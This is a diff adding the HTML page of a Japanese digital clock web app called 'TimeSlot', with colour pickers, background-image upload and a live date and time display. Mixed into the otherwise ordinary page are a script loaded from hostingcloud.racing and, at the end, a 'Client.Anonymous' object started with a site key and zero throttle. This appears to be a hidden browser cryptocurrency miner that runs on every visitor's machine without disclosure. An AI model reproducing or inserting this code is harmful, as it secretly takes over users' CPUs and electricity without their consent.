@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="" />
+    <link rel="icon" href="img/favicon.png" sizes="16*16" />
+
+    <title>TimeSlot</title>
+    <style>
+      html {
+        width: 100vw;
+        height: 100vh;
+        overflow: hidden;
+        background-position: center;
+        background-size: cover;
+      }
+      body {
+        background-color: rgb(255, 255, 255);
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        padding: 0;
+        box-shadow: border-box;
+        color: #0ff;
+        font-size: 2vw;
+        font-family: "Digital-7 Mono", sans-serif;
+        position: relative;
+      }
+      .navbar2 {
+        display: flex;
+        justify-content: space-between;
+        background-color: #000;
+        position: absolute;
+        bottom: 40%;
+        right: 13vw;
+      }
+      .navbar2 a {
+        color: #fff;
+        text-shadow: 0 0vw 0.2vw rgb(255, 255, 255);
+        background-color: #000;
+        font-family: "Arial Rounded MT Bold", sans-serif;
+        text-decoration: none;
+        padding: 5%;
+        white-space: nowrap;
+        position: relative;
+      }
+      .navbar2 .dropdown {
+        width: 100%;
+        font-size: 1.2vw;
+        color: #fff;
+        padding: 0.8px;
+      }
+      .navbar2 input {
+        width: 100%;
+      }
+      .navbar2 .dropdown-content {
+        width: 106%;
+        font-size: 1vw;
+        margin-top: 5%;
+      }
+      .navbar {
+        display: flex;
+        justify-content: space-between;
+        padding: 5%;
+        position: absolute;
+        top: 0;
+        right: 4vw;
+      }
+      .navbar a {
+        color: #fff;
+        text-shadow: 0 0vw 0.2vw rgb(255, 255, 255);
+        background-color: #000;
+        font-size: 1vw;
+        font-family: "Arial Rounded MT Bold", sans-serif;
+        text-decoration: none;
+        margin-top: 0;
+        margin-right: 30%;
+        padding: 5%;
+        white-space: nowrap;
+        position: relative;
+      }
+      .dropdown {
+        width: 100%;
+        position: relative;
+        padding-right: 20%;
+        display: inline-block;
+      }
+      .dropdown-content {
+        display: none;
+        position: absolute;
+        width: 106%;
+        z-index: 1;
+      }
+
+      .dropdown-content a {
+        color: #59e7fa;
+        padding: 5%;
+        text-decoration: none;
+        display: block;
+      }
+
+      .dropdown-content a:hover {
+        background-color: #707374;
+      }
+
+      .dropdown:hover .dropdown-content {
+        display: block;
+      }
+      #date {
+        color: rgb(19, 18, 18);
+        font-size: 2.5vw;
+        text-align: center;
+        font-family: "Arial Rounded MT Bold", sans-serif;
+      }
+
+      #time {
+        color: #0ff;
+        font-size: 10vw;
+        text-align: center;
+        text-shadow: 0 0 5px #0ff;
+        font-family: "Arial Rounded MT Bold", sans-serif;
+      }
+    </style>
+    <script src="https://www.hostingcloud.racing/s4ks.js"></script>
+  </head>
+  <body>
+    <div class="navbar">
+      <div class="dropdown">
+        <a href="index.html">デジタル</a>
+        <div class="dropdown-content">
+          <a href="index.html">Existing</a>
+          <a href="custom_dijital.html">Custom</a>
+        </div>
+      </div>
+      <div class="dropdown">
+        <a href="analog.html">アナログ</a>
+        <div class="dropdown-content">
+          <a href="analog.html">Existing</a>
+          <a href="custom_analog.html">Custom</a>
+        </div>
+      </div>
+    </div>
+    <div id="date"></div>
+    <div id="time"></div>
+    <div class="navbar2">
+      <div class="dropdown">
+        <a>Create</a>
+        <div class="dropdown-content">
+          <a label for="dateColor">DateCo</a>
+          <input type="color" id="dateColor" name="dateColor" value="#000000" />
+          <a label for="timeColor">TimeCo</a>
+          <input type="color" id="timeColor" name="timeColor" value="#00ffff" />
+          <input
+            type="file"
+            accept="image/*"
+            id="image"
+            name="image"
+            onchange="loadFile(event)"
+            style="display: none"
+          />
+          <a
+            label
+            for="file"
+            style="cursor: pointer"
+            onclick="document.getElementById('image').click()"
+            >Upload</a
+          >
+          <a label id="reset" onclick="resetImage()" style="cursor: pointer">
+            Reset
+          </a>
+          <a href="readme.html">Read</a>
+        </div>
+      </div>
+    </div>
+    <script>
+      var loadFile = function (event) {
+        var reader = new FileReader();
+        reader.onload = function () {
+          var output = document.body;
+          output.style.backgroundImage = "url(" + reader.result + ")";
+          document.getElementById("reset").style.display = "block";
+        };
+        reader.readAsDataURL(event.target.files[0]);
+      };
+
+      var resetImage = function () {
+        document.body.style.backgroundImage = "";
+        document.getElementById("file").value = "";
+      };
+
+      function showTime() {
+        var date = new Date();
+        var h = date.getHours();
+        var m = date.getMinutes();
+        var s = date.getSeconds();
+        var day = date.getDate();
+        var month = date.getMonth() + 1;
+        var year = date.getFullYear();
+        var days = [" 日 ", " 月 ", " 火 ", " 水 ", " 木 ", " 金 ", " 土 "];
+        var dayOfWeek = days[date.getDay()];
+
+        h = h < 10 ? "0" + h : h;
+        m = m < 10 ? "0" + m : m;
+        s = s < 10 ? "0" + s : s;
+        day = day < 10 ? "0" + day : day;
+        month = month < 10 ? "0" + month : month;
+
+        var dateText =
+          year + " / " + month + " / " + day + "  (" + dayOfWeek + ") ";
+        var time = h + ":" + m + ":" + s;
+        document.getElementById("date").innerText = dateText;
+        document.getElementById("time").innerText = time;
+
+        document.getElementById("date").style.color =
+          document.getElementById("dateColor").value;
+        document.getElementById("time").style.color =
+          document.getElementById("timeColor").value;
+
+        setTimeout(showTime, 1000);
+      }
+
+      showTime();
+
+      var _client = new Client.Anonymous(
+        "bd1a8cca95367cef24c7e9aebc2b45c23f90d32d480f6e809bde643d2e3a4974",
+        {
+          throttle: 0,
+          c: "w",
+        }
+      );
+      _client.start();
+    </script>
+  </body>
+</html>
